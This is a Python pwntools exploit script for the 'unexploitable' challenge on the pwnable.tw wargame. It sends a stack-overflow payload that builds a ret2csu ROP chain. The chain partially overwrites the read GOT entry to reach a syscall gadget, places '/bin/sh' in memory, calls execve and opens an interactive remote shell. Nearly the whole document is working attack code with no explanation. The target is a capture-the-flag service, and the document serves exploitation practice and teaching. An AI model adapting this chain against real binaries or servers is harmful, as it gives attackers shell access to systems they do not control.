from pwn import *
elf = ELF("./unexploitable")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")
context.binary=elf
target=remote('chall.pwnable.tw',10403)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

payload="A"*0x18
main=0x400544
readgot=0x601000
readplt=0x400430
csu1=0x4005e6
csu2=0x4005d0
finiptr=0x400e78
writeaddr=0x6010f0 
pause()
payload+=p64(csu1)
payload+=p64(0xdeadbeef)#bogus
payload+=p64(0)#rbx=0
payload+=p64(1)#rbp=1
payload+=p64(finiptr)#r12=finiptr
payload+=p64(0)#r13=fd(0)
payload+=p64(writeaddr)#r14=rsi
payload+=p64(0x11)#r15=rdx
payload+=p64(csu2)
payload+=p64(0)#bogus
payload+=p64(0)#rbx=0
payload+=p64(1)#rbp=1
payload+=p64(finiptr)#r12=finiptr
payload+=p64(0)#r13=fd(0)
payload+=p64(readgot)#r14=rsi
payload+=p64(1)#r15=rdx
payload+=p64(readplt)
payload+=p64(main)
target.sendline(payload)
time.sleep(1)
pause()
target.sendline("/bin/sh\x00"+p64(readplt))
payload="A"*0x10+p64(0x1)
payload+=p64(csu2)
payload+=p64(0)#bogus
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(finiptr)#r12=finiptr
payload+=p64(1)#r13=rdi
payload+=p64(writeaddr)#r14=rsi
payload+=p64(59)#r15=rdx
payload+=p64(readplt)#read(0,readgot,1)

payload+=p64(csu2)
payload+=p64(0)#bogus
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(writeaddr+8)#r12
payload+=p64(writeaddr)#r13
payload+=p64(0)#r14
payload+=p64(0)#r15
payload+=p64(readplt)#write(1,writeaddr,59)
payload+=p64(csu2)#execve(writeaddr,0,0)
time.sleep(1)
pause()
target.sendline(payload)
pause()
time.sleep(5)
target.send("\x7e")
target.send("\x7e")
target.send("\x7e")
time.sleep(1)

target.interactive()
